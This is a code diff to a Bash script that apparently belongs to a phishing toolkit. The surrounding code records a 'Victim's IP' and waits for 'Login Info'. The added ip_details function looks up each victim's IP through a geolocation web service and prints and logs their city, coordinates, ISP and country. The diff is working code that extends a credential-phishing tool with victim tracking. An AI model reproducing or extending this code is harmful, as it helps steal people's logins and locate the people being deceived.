@@ -480,11 +480,71 @@ capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
+				ip_details
 	logs_full_dir="${files_dir}/${site_name}/${logs_dir}"
 	mkdir ${logs_dir}
 	mv ${logs_dir} ${files_dir}/${site_name}
-        echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}/ip.txt"
+        echo -ne "\n${BLUE} IP Details Saved in : ${GREEN} ${logs_full_dir}"
 	mv .server/www/ip.txt ${logs_full_dir}
+}
+ip_details() {
+	IFS='\n'
+	iptracker=$(curl -s -L "http://ipwhois.app/json/$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > location.txt &&  grep -o '"[^"]*"\s*:\s*"[^"]*"' location.txt > track.txt)
+	IFS=$'\n'
+	iptt=$(sed -n 's/"ip"://p' track.txt)
+
+	if [[ $iptt != "" ]]; then
+	echo -e  "\n${GREEN} Device ip: ${NC} $iptt"
+	fi
+	iptype=$(sed -n 's/"type"://p' track.txt)
+	if [[ $iptype != "" ]]; then
+	echo -e "\n${GREEN} IP type: ${NC} $iptype"
+	fi
+	latitude=$(sed -n 's/"latitude"://p' track.txt)
+	if [[ $latitude != "" ]]; then
+	echo -e  "\n${GREEN} Latitude:  ${NC} $latitude"
+	fi
+	longitude=$(sed -n 's/"longitude"://p' track.txt)
+	if [[ $longitude != "" ]]; then
+	echo -e  "\n${GREEN} Longitude:  ${NC} $longitude"
+	fi
+	city=$(sed -n 's/"city"://p' track.txt)
+	if [[ $city != "" ]]; then
+	echo -e "\n${GREEN} City: ${NC} $city"
+	fi
+	isp=$(sed -n 's/"isp"://p' track.txt)
+	if [[ $isp != "" ]]; then
+	echo -e "\n${GREEN} Isp: ${NC} $isp"
+	fi
+	country=$(sed -n 's/"country"://p' track.txt)
+	if [[ $country != "" ]]; then
+	echo -e  "\n${GREEN} Country: ${NC} $country"
+	fi
+	flag=$(sed -n 's/"country_flag"://p' track.txt)
+	if [[ $flag != "" ]]; then
+	echo -e "\n${GREEN} Country flag: ${NC} $flag"
+	fi
+	cap=$(sed -n 's/"country_capital"://p' track.txt)
+	if [[ $cap != "" ]]; then
+	echo -e "\n${GREEN} Country capital: ${NC} $cap"
+	fi
+	phon=$(sed -n 's/"country_phone"://p' track.txt)
+	if [[ $phon != "" ]]; then
+	echo -e "\n${GREEN} Country code: ${NC} $phon"
+	fi
+	continent=$(sed -n 's/"continent"://p' track.txt)
+	if [[ $continent != "" ]]; then
+	echo -e  "\n${GREEN} Continent:  ${NC} $continent"
+	fi
+	ccode=$(sed -n 's/"currency_code"://p' track.txt)
+	if [[ $ccode != "" ]]; then
+	echo -e "\n${GREEN} Currency code: ${NC} $ccode"
+	fi
+	region=$(sed -n 's/"region"://p' track.txt)
+	if [[ $region != "" ]]; then
+	echo -e "\n${GREEN} State: ${NC} $region"
+	fi
+	mv track.txt ${logs_full_dir}
 }
 capture_data_image() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
